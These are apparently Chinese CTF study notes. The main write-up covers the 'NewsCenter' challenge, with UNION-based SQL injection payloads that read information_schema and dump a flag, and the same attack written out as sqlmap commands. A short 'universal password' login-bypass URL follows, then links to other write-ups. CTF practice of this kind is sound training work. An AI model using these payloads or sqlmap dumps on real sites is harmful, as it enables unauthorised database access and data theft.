# NewsCenter

## 目标

简单的SQL注入，读取 information_schema 元数据，然后读取flag。
sqlmap 也可解。

## 环境
windows

## 工具
sqlmap

## 分析过程

1.初步探测,发现搜索框存在注入 ' union select 1,2,3 #

2.获取数据库名，表名 ' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #

3.获取news 表的字段名，数据类型 ' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='news'#

4.获取f1agfl4gher3 字段名 数据类型 ' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='secret_table'#

5.得到flag ' and 0 union select 1,2,fl4g from secret_table #


## sqlmap版本


1.获取注入点

```bash
sqlmap -u http://192.168.100.161:53459 --data "search=df"
```


2.获取数据库信息

```bash
sqlmap -u http://192.168.100.161:53459 --data "search=df" -dbs
```


3.获取库内表信息

```bash
sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news --tables
```


4.获取表内字段信息

```bash
sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news -T secret_table --columns
```


5.获取字段内容，得到flag

```bash
sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news -T secret_table -C "fl4g" --dump
```

# 万能密码

http://f7c0ad9c-3f3f-443b-a0ef-6faf2b97c32c.node3.buuoj.cn/check.php?username=admin'or'1'='1&password=admin'or'1'='1


# 随便注

https://www.cnblogs.com/chalan630/p/12583667.html


# [SUCTF 2019]EasySQL1

https://www.cnblogs.com/ophxc/p/12879732.html

